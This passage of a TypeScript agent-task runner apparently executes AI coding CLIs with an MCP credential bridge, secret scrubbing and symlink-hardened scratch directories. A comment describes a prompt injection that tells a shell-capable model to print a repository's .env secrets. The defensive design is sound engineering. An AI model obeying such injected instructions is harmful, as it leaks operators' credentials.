		git = await finalizeWorkspace(taskId, workspaceResolution.descriptor, payload, io, publishFence, signal);
		if (git.error) {
			failures.push(`git finalize failed: ${git.error}`);
		} else if (git.publishWithheld) {
			// Named apart from a git failure on purpose: nothing is broken,
			// the node declined to write a branch it may no longer own, and
			// the operator needs to read that rather than debug Git.
			failures.push(`publish withheld: ${git.publishWithheld}`);
			io.onPublishWithheld?.(git.publishWithheld);
		}
	}
	throwIfAgentTaskAborted(signal);

	// EW-807: the assembled outcome is measured the way `completeJob`
	// measures it and trimmed — by shedding LOG TEXT — until it fits. The
	// setup phase made this reachable on the GREEN path (8 steps x an 8 KiB
	// tail of a package manager's output), and the platform's answer to an
	// oversize result is to reject the settlement, which the worker loop
	// re-reports as a FAILURE and `completeJob` then stores with no result
	// at all: verdict, setup block, owner question and pushed branch, gone.
	// A shorter install log is a far cheaper loss. See
	// {@link fitNodeOutcomeToResultBudget}.
	return fitNodeOutcomeToResultBudget({
		status: failures.length === 0 ? 'succeeded' : 'failed',
		taskId,
		runId,
		workspace: workspaceResolution.descriptor,
		steps: stepResults,
		// Conditional keys: a run that carried no setup phase reports exactly
		// what it always did.
		...(setupResults.length > 0 ? { setup: setupResults } : {}),
		...(setup.length > 0 ? { setupStatus } : {}),
		...(execution ? { model } : {}),
		...(checkResults.length > 0 ? { checks: checkResults } : {}),
		gateStatus,
		...(git ? { git } : {}),
		...(mountGit && mountGit.length > 0 ? { mountGit } : {}),
		// Conditional key: a run without a question reports exactly what it
		// always did (`question: null` would be a wire change for nothing).
		...(question ? { question } : {}),
		// Same posture for the MCP bridge: absent unless the job actually
		// asked for one. NEVER carries the token — only whether the bridge
		// ran and how many tool calls went through it.
		...(mcp ? { mcp } : {}),
		...(failures.length > 0 ? { failureReason: failures.join('; ') } : {})
	});
}

function resolveExecution(payload: FleetAgentTaskPayload): FleetAgentModelExecution | null {
	if (payload.execution === undefined || payload.execution === null) {
		return null;
	}
	try {
		return normalizeFleetAgentModelExecution(payload.execution);
	} catch (error) {
		if (error instanceof FleetAgentExecutionError) {
			throw new AgentTaskPayloadError(error.message);
		}
		throw error;
	}
}

/**
 * Self-build slice Z (EW-796) — read the payload's MCP block.
 *
 * Strict on the shape and silent about a malformed one: the block is
 * written by the platform's own planner, so anything that is not exactly
 * `{ enabled: true, serverUrl, serverName }` is treated as "no bridge"
 * rather than as a payload error. Failing the whole Task because an
 * optional tool channel was mis-serialised would be the wrong trade —
 * and `null` here is the same fail-closed answer a legacy job produces.
 */
function resolveMcpBridgeSpec(payload: FleetAgentTaskPayload): FleetAgentTaskMcpBridge | null {
	const mcp = payload.mcp;
	if (!mcp || typeof mcp !== 'object') return null;
	if (mcp.enabled !== true) return null;
	if (typeof mcp.serverUrl !== 'string' || !mcp.serverUrl.trim()) return null;
	if (typeof mcp.serverName !== 'string' || !mcp.serverName.trim()) return null;
	return {
		enabled: true,
		serverUrl: mcp.serverUrl.trim(),
		serverName: mcp.serverName.trim(),
		...(Array.isArray(mcp.toolFamilies) ? { toolFamilies: mcp.toolFamilies } : {})
	};
}

/**
 * The setup phase's budget (EW-807). An install is slower and noisier
 * than any test run, so it gets its own default, its own ceiling and its
 * own log window — and it gets them by PARAMETER, through the one command
 * runner, rather than by a second runner that would let the env scrub and
 * the termination proof drift apart between phases.
 */
const SETUP_COMMAND_LIMITS: NodeCommandLimits = {
	defaultTimeoutSec: FLEET_AGENT_TASK_SETUP_DEFAULT_TIMEOUT_SEC,
	maxTimeoutSec: FLEET_AGENT_TASK_SETUP_MAX_TIMEOUT_SEC,
	logTailBytes: FLEET_AGENT_TASK_SETUP_LOG_TAIL_BYTES
};

/**
 * Run one ordered phase of commands, each in the repository IT names.
 *
 * The one place a command's root directory is decided. Before EW-807 every
 * step and every check was handed `workspaceResolution.path` — the primary
 * worktree — so a run that edited three repositories tested one of them.
 *
 * `mountDir` is resolved by LOOKUP against the descriptor this run's
 * provisioner returned, never by joining a string onto a path; a name that
 * is not a mount of this run REFUSES the job rather than quietly falling
 * back to the primary, because "we could not find the repository you asked
 * us to test, so we tested a different one" is not a verdict. See
 * {@link resolveCommandRoot}.
 */
async function runCommandPhase(
	commands: readonly WireCheck[],
	context: ResolvedAgentTask,
	io: AgentTaskIo,
	signal: AbortSignal | undefined,
	limits: NodeCommandLimits | undefined,
	reported: (result: NodeCheckResult) => NodeCheckResult
): Promise<NodeCheckResult[]> {
	const results: NodeCheckResult[] = [];
	for (const command of commands) {
		throwIfAgentTaskAborted(signal);
		const root = await resolveCommandRoot(
			command.mountDir,
			context.workspaceResolution.path,
			context.workspaceResolution.descriptor?.mounts,
			io.commandRootFs
		);
		results.push(reported(await runNodeCommandStep(command, root, io, signal, limits)));
		throwIfAgentTaskAborted(signal);
	}
	return results;
}

/** Longest id fragment quoted into a failure reason, which lands on the job row. */
const SETUP_FAILURE_ID_MAX_CHARS = 60;
/** How many failing setup steps are named before the reason is elided. */
const SETUP_FAILURE_MAX_NAMED = 3;

/**
 * Say SETUP FAILED, in those words, and say which step.
 *
 * The whole point of the phase is that this sentence never reads as "a
 * test failed". It lands in `failureReason`, which is what the run report
 * and the Task page show a human.
 */
function describeSetupFailure(setup: readonly WireCheck[], results: readonly NodeCheckResult[]): string {
	const failed = setup
		.map((step, index) => ({ step, result: results[index] }))
		.filter(({ step, result }) => step.required !== false && result && result.status !== 'green')
		.map(({ step, result }) => {
			const id = step.id.slice(0, SETUP_FAILURE_ID_MAX_CHARS);
			switch (result.status) {
				case 'timeout':
					return `'${id}' timed out`;
				case 'error':
					return `'${id}' could not be started`;
				default:
					return `'${id}' exited ${result.exitCode ?? 'without a code'}`;
			}
		});
	const named = failed.slice(0, SETUP_FAILURE_MAX_NAMED).join('; ');
	const rest =
		failed.length > SETUP_FAILURE_MAX_NAMED ? ` (and ${failed.length - SETUP_FAILURE_MAX_NAMED} more)` : '';
	return (
		`SETUP FAILED: ${named}${rest}. The workspace was never prepared, so the model, the steps and the ` +
		`acceptance checks did not run — this is not a failing test.`
	);
}

/**
 * Validate the wire setup phase. Same refusal posture as the steps and the
 * checks: a malformed entry fails the job rather than being dropped,
 * because a silently dropped install is a run whose every later verdict is
 * about the missing dependencies.
 */
export function normalizeAgentTaskSetup(raw: unknown): WireCheck[] {
	if (raw === undefined || raw === null) {
		return [];
	}
	if (!Array.isArray(raw)) {
		throw new AgentTaskPayloadError('Job payload `setup` must be an array');
	}
	if (raw.length > FLEET_AGENT_TASK_MAX_SETUP_STEPS) {
		throw new AgentTaskPayloadError(
			`Job carries ${raw.length} setup steps; the per-job ceiling is ${FLEET_AGENT_TASK_MAX_SETUP_STEPS}`
		);
	}
	return normalizeWireCommands(raw, 'Setup step');
}

function resolveAcceptanceChecks(payload: FleetAgentTaskPayload): WireCheck[] {
	if (payload.acceptanceChecks === undefined || payload.acceptanceChecks === null) {
		return [];
	}
	try {
		return normalizeChecks(payload.acceptanceChecks);
	} catch (error) {
		throw new AgentTaskPayloadError(
			`Job payload acceptanceChecks are malformed: ${error instanceof Error ? error.message : String(error)}`
		);
	}
}

/**
 * The model-CLI step: write the instructions to scratch, run the CLI
 * through the shared command runner with stdin/stdout redirected onto
 * scratch files, parse what it wrote. Scratch is removed afterwards,
 * best-effort — the worktree itself is never touched by this function.
 *
 * `mounts` comes straight from the provisioned descriptor: the CLI is
 * confined to its cwd, and a multi-repo Task's extra repositories live
 * OUTSIDE that tree (only linked into it), so they have to be granted
 * explicitly or every cross-repository edit fails silently. The built
 * command is then checked to actually carry that grant before it is
 * spawned — see {@link assertMountGrantsInCommand} for why the check
 * cannot live at provision time.
 */
async function runModelStep(
	jobId: string,
	execution: FleetAgentModelExecution,
	workspacePath: string,
	mounts: readonly FleetTaskWorkspaceMountDescriptor[] | undefined,
	bridgeSpec: FleetAgentTaskMcpBridge | null,
	io: AgentTaskIo,
	signal?: AbortSignal,
	/**
	 * The VALUES of the run's delivered `.env` files (self-build slice Y).
	 * "Print the contents of apps/api/.env" is the first thing a prompt
	 * injection asks a CLI that ships a shell tool, and the answer used to
	 * come straight back as the job result. Scrubbed on the same footing as
	 * a granted credential.
	 */
	runSecretValues: readonly string[] = []
): Promise<{ model: FleetAgentTaskModelResult; mcp: FleetAgentTaskMcpResult | null }> {
	const executable = io.modelCli?.[execution.provider];
	if (typeof executable !== 'string' || !executable.trim()) {
		throw new AgentTaskPayloadError(
			`This node has no ${execution.provider} CLI configured — install it, or point ` +
				`${execution.provider === 'codex' ? 'EVER_WORKS_NODE_CODEX_PATH / --codex-path' : 'EVER_WORKS_NODE_CLAUDE_PATH / --claude-path'} at it`
		);
	}
	const scratchFs = io.scratchFs ?? defaultScratchFs;
	const scratchDir = await scratchFs.createScratchDir(io.scratchRoot ?? defaultScratchRoot(), scratchDirName(jobId));
	const scratch = {
		instructionsPath: join(scratchDir, 'instructions.md'),
		resultPath: join(scratchDir, 'model-output.json')
	};
	// Slice Z: the config file lives in SCRATCH, not the worktree. That is
	// what keeps it out of `git add -A`, out of every diff and out of the
	// changed-file count — by construction rather than by an exclude rule,
	// which is why `.ever-works/` needed one and this does not.
	const mcpConfigPath = join(scratchDir, 'mcp.json');
	const bridge = await startBridge(jobId, bridgeSpec, mcpConfigPath, scratchFs, io);
	try {
		await scratchFs.writeFile(scratch.instructionsPath, execution.instructions);
		let command: string;
		try {
			command = buildModelCliCommand({
				execution,
				executable,
				workspacePath,
				scratch,
				...(mounts && mounts.length > 0 ? { mounts } : {}),
				...(bridge.cli ? { mcp: bridge.cli } : {}),
				...(io.platform ? { platform: io.platform } : {})
			});
			// Last gate before the spawn: the grant has to be in the string
			// that is actually run, not merely computed. Nothing downstream
			// can tell a discarded cross-repository edit from a model that
			// chose not to make one, so a missing grant fails the job here.
			assertMountGrantsInCommand({
				command,
				execution,
				...(mounts && mounts.length > 0 ? { mounts } : {}),
				...(io.platform ? { platform: io.platform } : {})
			});
		} catch (error) {
			if (error instanceof ModelCliCommandError) throw new AgentTaskPayloadError(error.message);
			throw error;
		}
		// `execution.envPassthrough` is unchanged and deliberately so: the
		// run token is NOT in it, is not in the child's environment, and
		// could not be even if a payload asked — `EVER_WORKS_` is refused
		// by `NODE_PLATFORM_OWNED_ENV_PATTERN` whatever a grant says.
		const step = buildModelCliStep(execution, command, execution.envPassthrough, execution.envGrants);
		const result = await runNodeCommandStep(step, workspacePath, io, signal);
		const rawOutput = await scratchFs.readFile(scratch.resultPath);
		// `envPassthrough` names the credential env vars this CLI was handed;
		// their values are scrubbed out of the summary and output tail before
		// the result leaves the node. `envGrants` (self-build slice Y) names
		// the per-repository grants and is scrubbed on the SAME footing: a
		// granted DATABASE_URL is a credential the model could have echoed,
		// and the whole point of granting one is that it stays on the machine.
		const model = parseModelCliResult(
			execution.provider,
			rawOutput,
			result,
			execution.envPassthrough,
			execution.envGrants,
			io.parentEnv,
			runSecretValues
		);
		return { model, mcp: bridge.result() };
	} finally {
		// Order matters. The proxy stops FIRST (a still-listening socket
		// after the model exited is a live credential path nothing is
		// watching), then the platform is told to revoke, and only then is
		// scratch — `mcp.json` included — removed.
		await bridge.stop();
		try {
			await scratchFs.remove(scratchDir);
		} catch {
			// Scratch cleanup is best-effort: a leftover file must never fail
			// a run whose verdict is already known.
		}
	}
}

/** What {@link startBridge} hands back to the model step. */
interface ActiveMcpBridge {
	/** Flags to add to the CLI command, or null when there is no bridge. */
	cli: { configPath: string; serverName: string; serverUrl: string } | null;
	/** Stop the listener, revoke the credential. Idempotent, never throws. */
	stop: () => Promise<void>;
	/** The block reported on the job result. Null when no bridge was asked for. */
	result: () => FleetAgentTaskMcpResult | null;
}

/** A bridge that was never asked for: no listener, no credential, no result key. */
const NO_MCP_BRIDGE: ActiveMcpBridge = {
	cli: null,
	stop: async () => undefined,
	result: () => null
};

/**
 * Self-build slice Z (EW-796) — mint, listen and write the ephemeral
 * config, or degrade to today's tool-free run.
 *
 * ## Where the token is, at every moment
 *
 *   1. the platform generates it and returns it in ONE HTTPS response;
 *   2. it is assigned to the local `token` variable here — a closure
 *      variable in the node process, nothing more;
 *   3. `logger.protect(token)` makes the redacting logger scrub it out
 *      of anything the node ever emits, so even a mistake cannot print it;
 *   4. the proxy's `token()` getter reads that variable per request and
 *      attaches it to the OUTBOUND header, then drops it;
 *   5. `stop()` clears the variable and asks the platform to revoke.
 *
 * It is never written to `mcp.json` (which holds only the loopback URL),
 * never put in the child's environment, and never returned on the job
 * result. The model can read the config file and learn nothing except a
 * localhost URL it was handed anyway.
 *
 * ## Degradation
 *
 * Any failure — the mint refused, the listener unable to bind, the config
 * unwritable — logs and returns a bridge with `cli: null`. The run then
 * proceeds EXACTLY as a run without the bridge and reports
 * `mcp: { enabled: false, unavailableReason }`, so an operator can see
 * that tools were asked for and did not appear. A bridge that cannot
 * start must never fail a Task.
 */
async function startBridge(
	jobId: string,
	spec: FleetAgentTaskMcpBridge | null,
	configPath: string,
	scratchFs: AgentTaskScratchFs,
	io: AgentTaskIo
): Promise<ActiveMcpBridge> {
	if (!spec?.enabled) return NO_MCP_BRIDGE;
	const bridgeIo = io.mcpBridge;
	if (!bridgeIo) {
		return unavailableBridge('this node has no fleet job client to mint a run credential with');
	}

	let token: string | null = null;
	let proxy: McpLoopbackProxy | null = null;
	try {
		const credential = await bridgeIo.mint(jobId);
		token = credential.token;
		io.logger?.protect(token);
		const start = bridgeIo.start ?? startMcpLoopbackProxy;
		proxy = await start({
			// The platform's answer wins over the payload's copy: the
			// payload was written at plan time and the credential was minted
			// just now, so the response is the fresher fact.
			upstreamUrl: credential.serverUrl || spec.serverUrl,
			token: () => token,
			...(io.logger ? { logger: io.logger } : {}),
			...(bridgeIo.fetchFn ? { fetchFn: bridgeIo.fetchFn } : {})
		});
		// The config carries the loopback URL and NOTHING else — no header
		// block, no credential. Both CLIs accept this shape; codex
		// additionally gets the same URL as an argv override, because it
		// reads MCP servers from its own config rather than from a file
		// named on the command line.
		await scratchFs.writeFile(
			configPath,
			JSON.stringify({ mcpServers: { [spec.serverName]: { type: 'http', url: proxy.url } } }, null, 2) + '\n'
		);
	} catch (error) {
		const reason = describeBridgeFailure(error, io);
		io.logger?.warn(`MCP bridge unavailable for job ${jobId}: ${reason}`);
		token = null;
		if (proxy) await proxy.close().catch(() => undefined);
		await bridgeIo.revoke?.(jobId).catch(() => undefined);
		return unavailableBridge(reason);
	}

	// ── The renewal timer ────────────────────────────────────────────────
	//
	// A run token expires with the LEASE it was minted under — the default
	// lease TTL is 300 s while a model step may legitimately run for half an
	// hour. Binding the two is the whole point (a node that loses its claim
	// loses its credential in the same breath), so the answer is not a
	// longer token but a shorter loop: re-mint as the lease is renewed.
	//
	// Every re-mint ROTATES — the platform deactivates the predecessor — so
	// at most one token per job is ever live, and the new one is picked up
	// by the proxy's getter on the very next request without restarting the
	// listener or telling the model anything.
	//
	// A failed renewal is NOT fatal: the current token stays valid until its
	// own expiry, the next tick tries again, and the worst case is the tool
	// channel going quiet for the rest of the run while the run itself
	// continues exactly as a run without tools.
	const schedule = bridgeIo.scheduleRenewal ?? defaultScheduleRenewal;
	const renewal = schedule(() => {
		void (async () => {
			try {
				const renewed = await bridgeIo.mint(jobId);
				io.logger?.protect(renewed.token);
				// The swap is a single assignment to the closure variable the
				// proxy reads per request, so there is no window in which the
				// proxy holds a half-updated credential.
				token = renewed.token;
			} catch (error) {
				io.logger?.warn(
					`MCP run credential renewal failed for job ${jobId}: ${describeBridgeFailure(error, io)}`
				);
			}
		})();
	}, MCP_CREDENTIAL_RENEWAL_INTERVAL_MS);

	const activeProxy = proxy;
	let stopped = false;
	return {
		cli: { configPath, serverName: spec.serverName, serverUrl: activeProxy.url },
		stop: async () => {
			if (stopped) return;
			stopped = true;
			// Drop the credential from memory BEFORE anything that can
			// await: from this instant no in-flight request can pick it up
			// (the proxy's getter answers null and refuses locally). The
			// renewal timer goes first so it cannot put a fresh one back.
			renewal.cancel();
			token = null;
			await activeProxy.close().catch(() => undefined);
			try {
				await bridgeIo.revoke?.(jobId);
			} catch (error) {
				// The platform revokes again when the job settles, and the
				// token expires with the lease regardless, so a failed early
				// revoke narrows to a bounded window rather than an open one.
				io.logger?.warn(
					`MCP run credential revoke failed for job ${jobId}: ${describeBridgeFailure(error, io)}`
				);
			}
		},
		result: () => ({ enabled: true, toolCalls: activeProxy.toolCalls() })
	};
}

/**
 * How often the node re-mints the run credential.
 *
 * Half the platform's MINIMUM lease TTL rather than half of whatever this
 * job happened to get: the node does not know the lease policy, and a
 * renewal that is too frequent costs one cheap authenticated POST while a
 * renewal that is too rare costs the run its tools. 120 s sits comfortably
 * inside the 300 s default TTL plus its 60 s grace.
 */
export const MCP_CREDENTIAL_RENEWAL_INTERVAL_MS = 120_000;

/** `setInterval`, unref'd so a stray timer can never hold the process open. */
function defaultScheduleRenewal(fn: () => void, intervalMs: number): { cancel: () => void } {
	const handle = setInterval(fn, intervalMs);
	(handle as { unref?: () => void }).unref?.();
	return { cancel: () => clearInterval(handle) };
}

function unavailableBridge(reason: string): ActiveMcpBridge {
	return {
		cli: null,
		stop: async () => undefined,
		result: () => ({ enabled: false, toolCalls: null, unavailableReason: reason })
	};
}

/** Redacted through the node logger, so a token in an error text cannot escape. */
function describeBridgeFailure(error: unknown, io: AgentTaskIo): string {
	const raw = error instanceof Error ? error.message : String(error);
	return io.logger?.redact(raw) ?? raw;
}

async function finalizeWorkspace(
	taskId: string,
	descriptor: FleetTaskWorkspaceDescriptor,
	payload: FleetAgentTaskPayload,
	io: AgentTaskIo,
	publishFence: WorkspacePublishFence | null,
	signal?: AbortSignal
): Promise<FleetAgentTaskGitResult> {
	const base: FleetAgentTaskGitResult = {
		branch: descriptor.branch,
		baseSha: descriptor.baseSha,
		headSha: null,
		empty: false,
		pushed: false
	};
	if (!io.finalizeWorkspace) {
		return { ...base, error: 'this node has no workspace finalizer configured' };
	}
	const commitMessage =
		typeof payload.git?.commitMessage === 'string' && payload.git.commitMessage.trim()
			? payload.git.commitMessage.trim()
			: defaultAgentTaskCommitMessage(taskId);
	try {
		const finalized = await io.finalizeWorkspace(
			taskId,
			descriptor,
			{
				commitMessage,
				push: payload.git?.push !== false,
				...(publishFence ? { publishFence } : {})
			},
			signal
		);
		return {
			...base,
			headSha: finalized.headSha,
			empty: finalized.empty,
			pushed: finalized.pushed,
			...(finalized.changedFiles === undefined ? {} : { changedFiles: finalized.changedFiles }),
			...(finalized.publishWithheld === undefined ? {} : { publishWithheld: finalized.publishWithheld })
		};
	} catch (error) {
		if (error instanceof Error && error.name === 'AbortError') throw error;
		return { ...base, error: error instanceof Error ? error.message : String(error) };
	}
}

/**
 * Multi-repo (slice C): one git verdict per WRITABLE mount. `null` when the
 * workspace has no writable mounts, so single-repository runs report
 * exactly what they did before.
 */
async function finalizeMounts(
	taskId: string,
	descriptor: FleetTaskWorkspaceDescriptor,
	payload: FleetAgentTaskPayload,
	io: AgentTaskIo,
	publishFence: WorkspacePublishFence | null,
	signal?: AbortSignal
): Promise<FleetAgentTaskGitResult[] | null> {
	const writable = (descriptor.mounts ?? []).filter((mount) => mount.writable);
	if (writable.length === 0) return null;
	const toBase = (mount: (typeof writable)[number]): FleetAgentTaskGitResult => ({
		repositoryId: mount.repositoryId,
		mountDir: mount.mountDir,
		branch: mount.branch,
		baseSha: mount.baseSha,
		headSha: null,
		empty: false,
		pushed: false
	});
	if (!io.finalizeMounts) {
		return writable.map((mount) => ({ ...toBase(mount), error: 'this node has no mount finalizer configured' }));
	}
	const commitMessage =
		typeof payload.git?.commitMessage === 'string' && payload.git.commitMessage.trim()
			? payload.git.commitMessage.trim()
			: defaultAgentTaskCommitMessage(taskId);
	try {
		const results = await io.finalizeMounts(
			taskId,
			descriptor,
			{
				commitMessage,
				push: payload.git?.push !== false,
				...(publishFence ? { publishFence } : {})
			},
			signal
		);
		return results.map((result) => ({
			repositoryId: result.repositoryId,
			mountDir: result.mountDir,
			branch: result.branch,
			baseSha: result.baseSha,
			headSha: result.headSha,
			empty: result.empty,
			pushed: result.pushed,
			...(result.changedFiles === undefined ? {} : { changedFiles: result.changedFiles }),
			...(result.error ? { error: result.error } : {}),
			...(result.publishWithheld === undefined ? {} : { publishWithheld: result.publishWithheld })
		}));
	} catch (error) {
		if (error instanceof Error && error.name === 'AbortError') throw error;
		const message = error instanceof Error ? error.message : String(error);
		return writable.map((mount) => ({ ...toBase(mount), error: message }));
	}
}

function describeModelFailure(model: FleetAgentTaskModelResult): string {
	switch (model.status) {
		case 'timeout':
			return `${model.provider} timed out`;
		case 'error':
			return `${model.provider} could not be started`;
		default:
			return model.summary
				? `${model.provider} reported an error: ${model.summary.slice(0, 200)}`
				: `${model.provider} exited with code ${model.exitCode ?? 'unknown'}`;
	}
}

async function resolveAgentTaskWorkspace(
	taskId: string,
	payload: FleetAgentTaskPayload,
	io: AgentTaskIo,
	signal?: AbortSignal
): Promise<{ path: string; descriptor: FleetTaskWorkspaceDescriptor | null }> {
	if (payload.workspace != null) {
		if (typeof payload.workspacePath === 'string' && payload.workspacePath.trim()) {
			throw new AgentTaskPayloadError('Fleet agent-task payload cannot carry both workspace and workspacePath');
		}
		if (!io.provisionWorkspace) {
			throw new AgentTaskPayloadError('Fleet repository workspace provisioner is not configured on this node');
		}
		const descriptor = await io.provisionWorkspace(taskId, payload.workspace, signal);
		return { path: resolveWorkspacePath(descriptor.path, io), descriptor };
	}
	// No provision, and therefore none of the provisioner's checks. The
	// disk floor is the one that matters here: this path runs a model and
	// spends its whole budget on a volume nothing has measured, and the
	// lease gate measured a DIFFERENT one (the fleet workspace root).
	const path = resolveWorkspacePath(payload.workspacePath, io);
	await io.checkWorkspaceHeadroom?.(path, signal);
	return { path, descriptor: null };
}

/**
 * Validate the wire steps. A malformed entry is REFUSED rather than
 * skipped — silently dropping a step would report success for work that
 * never ran.
 */
export function normalizeAgentTaskSteps(raw: unknown): WireCheck[] {
	if (raw === undefined || raw === null) {
		return [];
	}
	if (!Array.isArray(raw)) {
		throw new AgentTaskPayloadError('Job payload `steps` must be an array');
	}
	if (raw.length > FLEET_AGENT_TASK_MAX_STEPS) {
		throw new AgentTaskPayloadError(
			`Job carries ${raw.length} steps; the per-job ceiling is ${FLEET_AGENT_TASK_MAX_STEPS}`
		);
	}
	return normalizeWireCommands(raw, 'Step');
}

/**
 * The per-entry validator `steps` and `setup` (EW-807) share, so the two
 * phases cannot disagree about what a command even is. `label` is what a
 * refusal calls the entry, so the message still names the field the
 * operator has to fix.
 */
function normalizeWireCommands(raw: readonly unknown[], label: string): WireCheck[] {
	return raw.map((entry, index) => {
		if (!entry || typeof entry !== 'object') {
			throw new AgentTaskPayloadError(`${label} at index ${index} is not an object`);
		}
		const step = entry as Partial<FleetAgentTaskStep> & Record<string, unknown>;
		const id = typeof step.id === 'string' ? step.id.trim() : '';
		const command = typeof step.command === 'string' ? step.command.trim() : '';
		if (!id) {
			throw new AgentTaskPayloadError(`${label} at index ${index} has no id`);
		}
		if (!command) {
			throw new AgentTaskPayloadError(`${label} '${id}' has no command`);
		}
		const out: WireCheck = { id, command };
		if (typeof step.cwd === 'string' && step.cwd.trim()) out.cwd = step.cwd.trim();
		// EW-807: WHICH repository this command runs in. Copied through and
		// resolved by `resolveCommandRoot` against the provisioned
		// descriptor, which is the gate — see `runCommandPhase`.
		if (typeof step.mountDir === 'string' && step.mountDir.trim()) out.mountDir = step.mountDir.trim();
		if (typeof step.timeoutSec === 'number') out.timeoutSec = step.timeoutSec;
		if (typeof step.required === 'boolean') out.required = step.required;
		if (Array.isArray(step.envPassthrough)) {
			out.envPassthrough = step.envPassthrough.filter((n): n is string => typeof n === 'string');
		}
		// `envGrants` is deliberately NOT read off the wire (EW-807).
		//
		// `normalizeChecks` never read it, so before this slice the two
		// normalizers disagreed: a per-command grant an acceptance check
		// refused was honoured for a step — and now, for the SETUP phase,
		// which runs first, before the model, at a 5400s ceiling. That is
		// the "two subtly-different runners" outcome `NodeCommandLimits`
		// exists to prevent, pointing the wrong way.
		//
		// Reconciled toward the narrower side: on this node a command's
		// grants come from ONE place, the run-level `execution.envGrants`
		// that `withRunEnvGrants` stamps on, which is the single list the
		// platform derives from the run's repo connections and the single
		// list an operator can audit. Nothing on the platform emits a
		// per-command grant today, so nothing loses a capability here.
		return out;
	});
}

/**
 * Where the steps run. Unlike `acceptance-checks` (whose workspace IS
 * the checked-out Task worktree and is therefore mandatory) an agent
 * task may legitimately run where the node service was installed — so an
 * absent `workspacePath` falls back to the node's own working directory.
 * A path that IS supplied must be absolute and exist: a command that
 * runs in the wrong place is worse than a job that fails fast.
 */
function resolveWorkspacePath(supplied: unknown, io: AgentTaskIo): string {
	const candidate =
		typeof supplied === 'string' && supplied.trim() ? supplied.trim() : (io.defaultWorkspacePath ?? '').trim();
	if (!candidate) {
		return process.cwd();
	}
	if (!isAbsolute(candidate)) {
		throw new AgentTaskPayloadError('workspacePath must be an absolute path on the node');
	}
	const exists = io.directoryExists ?? defaultDirectoryExists;
	if (!exists(candidate)) {
		throw new AgentTaskPayloadError(`workspacePath does not exist on this node: ${candidate}`);
	}
	return candidate;
}

function defaultDirectoryExists(path: string): boolean {
	try {
		return statSync(path).isDirectory();
	} catch {
		return false;
	}
}

/** Per-job scratch directory PREFIX — the job id is a uuid, but never trust the wire. */
function scratchDirName(jobId: string): string {
	const safe = jobId.replace(/[^A-Za-z0-9._-]/g, '_').slice(0, 80);
	return safe || 'job';
}

/** Default scratch root: the OS temp dir, namespaced to this node. */
export function defaultScratchRoot(): string {
	return join(tmpdir(), 'ever-works-node', 'agent-tasks');
}

/**
 * Production scratch filesystem. `createScratchDir` is `mkdtemp` under a
 * PRIVATE root: atomic and unique, so nothing sharing the temp dir can
 * pre-plant a symlink at the path the node is about to write to — and
 * the root itself is verified (`ensurePrivateScratchRoot`), so a link
 * planted at the root's predictable name cannot redirect the whole job
 * directory somewhere another local user controls. Exported for the
 * regression tests that prove exactly that.
 */
export const defaultScratchFs: AgentTaskScratchFs = {
	createScratchDir: async (root, prefix) => {
		const privateRoot = await ensurePrivateScratchRoot(root);
		return fs.mkdtemp(join(privateRoot, `${prefix}-`));
	},
	writeFile: (path, content) => fs.writeFile(path, content, { encoding: 'utf8', mode: 0o600 }),
	readFile: async (path) => {
		try {
			// Size the file BEFORE loading it. `buildModelCliCommand`
			// redirects the CLI's stdout straight to disk with `>`, so this
			// content never passes through Node's stdout capture and nothing
			// upstream bounds it. `MODEL_CLI_OUTPUT_TAIL_BYTES` truncates for
			// DISPLAY, but only after the whole file is already a string in
			// memory — by which point a looping or compromised CLI running up
			// to the 1800s ceiling has already exhausted the process, taking
			// every other job on this node down with it.
			//
			// Refusing beats truncating: the payload is `model-output.json`
			// and a partial read cannot be parsed anyway, so a clear failure
			// is more useful than a JSON error further down.
			const stat = await fs.stat(path);
			if (stat.size > MODEL_CLI_MAX_OUTPUT_BYTES) {
				throw new Error(
					`Model CLI output is ${stat.size} bytes; the ceiling is ${MODEL_CLI_MAX_OUTPUT_BYTES}. ` +
						'Refusing to load it — the run is failed rather than risking the node.'
				);
			}
			return await fs.readFile(path, { encoding: 'utf8' });
		} catch (error) {
			if ((error as NodeJS.ErrnoException).code === 'ENOENT') return null;
			throw error;
		}
	},
	remove: (path) => fs.rm(path, { recursive: true, force: true })
};

/**
 * Creates the scratch root (`0700`) and refuses to use it unless it —
 * and every ancestor below the OS temp dir — is a real directory that
 * belongs to this user.
 *
 * `mkdir(root, { recursive: true })` silently follows a symlink or a
 * junction planted at any of those names: on a shared temp dir another
 * local user could point `ever-works-node/` at a directory they own,
 * watch the job directory appear there and swap it for a link before
 * the node writes the instructions file. The temp dir itself (and, for
 * an operator-chosen root outside it, the root's ancestors) is trusted:
 * whoever controls those controls the account anyway.
 *
 * On POSIX the verified directories must be owned by the current user;
 * a root that pre-exists with group/other bits (an old umask) is
 * tightened to `0700` rather than refused. Returns the absolute root.
 */
export async function ensurePrivateScratchRoot(root: string): Promise<string> {
	const absolute = resolve(root);
	await fs.mkdir(absolute, { recursive: true, mode: 0o700 });
	const uid = process.platform === 'win32' ? undefined : process.getuid?.();
	for (const dir of scratchRootComponentsToVerify(absolute)) {
		const stat = await fs.lstat(dir);
		if (stat.isSymbolicLink() || !stat.isDirectory()) {
			throw new Error(
				`Refusing scratch root ${absolute}: ${dir} is not a real directory (a symlink or junction was planted there)`
			);
		}
		if (uid !== undefined) {
			if (stat.uid !== uid) {
				throw new Error(`Refusing scratch root ${absolute}: ${dir} is owned by another user`);
			}
			if ((stat.mode & 0o077) !== 0) await fs.chmod(dir, 0o700);
		}
	}
	return absolute;
}

/**
 * The directories `ensurePrivateScratchRoot` verifies: the root itself
 * plus each ancestor strictly below the OS temp dir when the root lives
 * there (the default), the root alone otherwise.
 */
function scratchRootComponentsToVerify(absolute: string): string[] {
	const temp = resolve(tmpdir());
	const rel = relative(temp, absolute);
	const underTemp = rel !== '' && !rel.startsWith('..') && !isAbsolute(rel);
	if (!underTemp) return [absolute];
	const components: string[] = [];
	let current = absolute;
	while (!samePath(current, temp) && dirname(current) !== current) {
		components.push(current);
		current = dirname(current);
	}
	return components;
}

function samePath(a: string, b: string): boolean {
	return process.platform === 'win32' ? a.toLowerCase() === b.toLowerCase() : a === b;
}

function throwIfAgentTaskAborted(signal?: AbortSignal): void {
	if (!signal?.aborted) return;
	const reason = signal.reason;
	const error = new Error(reason instanceof Error ? reason.message : 'Fleet agent task was cancelled');
	error.name = 'AbortError';
	throw error;
}

// Re-exported so the result shape is reachable from the executor barrel.
export type { TaskCheckResult as AgentTaskStepResult };
